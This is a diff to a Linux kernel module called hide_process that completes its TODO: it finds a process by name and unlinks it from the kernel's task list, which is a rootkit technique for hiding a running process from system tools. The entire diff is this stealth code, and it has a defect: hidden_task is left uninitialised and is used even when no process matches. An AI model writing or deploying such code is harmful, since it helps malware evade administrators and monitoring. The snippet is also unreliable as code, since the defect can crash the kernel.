@@ -8,14 +8,23 @@ module_param(target_process, charp, 0);
 
 static int __init hide_process_init(void) {
     struct task_struct *task;
-
+     struct task_struct *hidden_task;
     printk(KERN_INFO "Hide Process Module Loaded\n");
-
+    
     // 遍历所有进程
-    for_each_process(task) {
-        // TODO: hide target_process
-    }
+        for_each_process(task) {
+            if (!strcmp(task->comm, target_process)) {
+                hidden_task = task;
+                get_task_struct(hidden_task);
+                break;
+            }
+        }
 
+        if (hidden_task) {
+            list_del_rcu(&hidden_task->tasks);
+            synchronize_rcu();
+        }
+    
     return 0;
 }
 
